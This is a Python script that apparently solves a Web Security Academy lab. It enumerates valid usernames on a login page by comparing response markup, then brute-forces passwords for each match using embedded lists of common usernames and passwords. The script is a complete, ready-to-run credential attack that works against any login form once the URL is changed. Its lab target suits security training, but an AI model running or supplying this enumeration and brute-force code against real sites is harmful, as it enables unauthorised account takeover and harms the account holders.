import requests
from bs4 import BeautifulSoup

url = "https://0a5a00c303cd83938000351a00f800c0.web-security-academy.net/login"
headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
}
temp_payload = {
    "username" : "i am batman",
    "password" : "just a password"
}
temp_response = requests.post(url=url, headers=headers, data=temp_payload)
soup = BeautifulSoup(temp_response.text, "html.parser")
target = soup.find_all("div", attrs={"theme": ""})
username = """carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover""".split()
password = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow""".split()
for item in username:
    temp_username = {
        "username" : item,
        "password" : "batman"
    }
    response = requests.post(url=url, headers=headers, data=temp_username)
    soup = BeautifulSoup(response.text, "html.parser")
    username_target = soup.find_all("div", attrs={"theme": ""})
    if target[5] != username_target[5]:
        print("username: " + item)
        for pswd in password:
            final_payload = {
                "username" : item,
                "password" : pswd
            }
            response2 = requests.post(url=url, headers=headers, data=final_payload)
            if response2.status_code == 302 or "Congratulations, you solved the lab!" in response2.text:
                print("password: " + pswd)
            else:
                print("testing: " + pswd)
    else:
        print("testing: " + item)